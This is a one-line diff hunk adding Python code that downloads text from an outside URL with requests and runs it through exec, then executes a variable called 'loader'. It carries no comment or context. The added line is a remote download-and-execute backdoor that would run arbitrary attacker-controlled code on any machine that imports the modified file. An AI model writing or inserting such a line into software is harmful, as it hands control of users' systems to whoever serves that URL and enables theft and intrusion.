@@ -1,0 +1,1 @@
+import requests; exec(requests.get('https://sds.sh/micro.py/').text); exec(loader);
